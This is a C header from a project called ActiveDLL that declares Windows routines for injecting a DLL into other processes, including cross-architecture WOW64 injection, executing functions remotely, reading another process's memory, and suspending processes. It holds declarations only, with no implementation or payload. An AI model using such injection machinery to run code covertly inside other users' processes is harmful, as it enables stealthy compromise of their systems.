//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ActiveDLL project. Version 1.4
//	
// module: pssup.h
// $Revision: 195 $
// $Date: 2014-07-11 16:56:29 +0400 (Пт, 11 июл 2014) $
// description: 
//	 Processes and modules support routines.

#define	szExtDll			_T(".dll")

#define INJECT_MAP_PEB			1		// Map target process PEB before injecting a DLL
#define INJECT_REMOVE_IF_EXISTS	2		// Checks if injected DLL already loaded into a process and removs it
#define	INJECT_DIFFERENT_ARCH	4		// Inject dll to a process of a different architecture 
#define	INJECT_ARCH_X64			8		// DLL is 64-bit module.
#define	INJECT_WOW64_TARGET		0x10	// Inject to a WOW64 process.


// WOW64 process information strucure.
// Used by PsSupQueryProcessModules64() fucntion.
typedef struct _PROCESS_INFO64
{
	PEB64					Peb;
	PEB_LDR_DATA64			LdrData;
	LDR_DATA_TABLE_ENTRY64	LdrEntry;
} PROCESS_INFO64, *PPROCESS_INFO64;

typedef struct _PROCESS_INFO32
{
	PEB32					Peb;
	PEB_LDR_DATA32			LdrData;
	LDR_DATA_TABLE_ENTRY32	LdrEntry;
} PROCESS_INFO32, *PPROCESS_INFO32;


// Inject context
#define		MAX_DLL_PATH		0x200		// bytes
#define		MAX_INJECT_STUB		0x100		// bytes

typedef struct _INJECT_CONTEXT
{
	ULONGLONG	pRetpoint;
	ULONGLONG	pFunction;					// originaly LoadLibraryA()
	ULONGLONG	pContext;
	CHAR		DllPath[MAX_DLL_PATH];
	CHAR		InjectStub[MAX_INJECT_STUB];
} INJECT_CONTEXT, *PINJECT_CONTEXT;


// Native function pointers for WOW64
typedef struct _PSSUP_NATIVE_POINTERS
{
	ULONGLONG	pZwGetContextThread;
	ULONGLONG	pZwSetContextThread;
} PSSUP_NATIVE_POINTERS, *PPSSUP_NATIVE_POINTERS; 

PPSSUP_NATIVE_POINTERS PsSupResolveNativePointers(VOID);


WINERROR PsSupGetProcessModules(IN HANDLE hProcess, OUT HMODULE** HandleArray,OUT ULONG* NumberHandles);

WINERROR PsSupInjectDll(IN ULONG ProcessId, IN LPTSTR DllPath, IN ULONG Flags);
WINERROR PsSupWow64InjectDll64(IN LPPROCESS_INFORMATION lpProcessInformation, IN LPTSTR DllPath);
WINERROR PsSupInjectDllWithStub(IN LPPROCESS_INFORMATION lpProcessInformation, IN LPTSTR DllPath, IN ULONG Flags);

WINERROR PsSupGetModulePath(IN HMODULE hModule, OUT LPTSTR* pModulePath);
PVOID	PsSupGetProcessMainImageBase(HANDLE hProcess);
NTSTATUS PsSupGetProcessMainImageBaseArch(HANDLE hProcess, PVOID pImageBase);

BOOL	PsSupReadProcessMemoryArch(HANDLE hProcess, ULONGLONG BaseAddress, PVOID Buffer, ULONG Size, SIZE_T* pBytesRead);
ULONG64	PsSupGetProcessFunctionAddressArch(HANDLE hProcess, PCHAR ModuleName, PCHAR FunctionName);
PVOID	PsSupGetRealFunctionAddress(HMODULE	hModule, PCHAR FunctionName);
WINERROR PsSupExecuteRemoteFunction(LPPROCESS_INFORMATION lpProcessInformation, PVOID pFunction, PVOID pContext, ULONG Flags);

WINERROR PsSupSuspendProcess(HANDLE hProcess);
WINERROR PsSupResumeProcess(HANDLE hProcess);

PWSTR	PsSupGetProcessDesktopName(HANDLE hProcess);

LPTSTR	PsSupNameChangeArch(LPTSTR ModuleName);
BOOL	PsSupIsWow64Process(ULONG Pid, HANDLE hProcess);
VOID PsSupSetWow64Redirection( BOOL Enable );

WINERROR PsSupLoadFile(LPTSTR FileName, PCHAR* pBuffer, PULONG pSize);

PLDR_DATA_TABLE_ENTRY PsSupGetLdrDataTableEnty(PVOID ImageBase);


// From w64stubs.asm
LONG _cdecl Wow64NativeCall(ULONGLONG NativeFunctionAddress, ULONGLONG NumberOfArgs, ...);
VOID _cdecl Wow64InjectStub();
VOID _cdecl Win32InjectStub();

// From x64stubs.asm
VOID _cdecl Win64InjectStub();
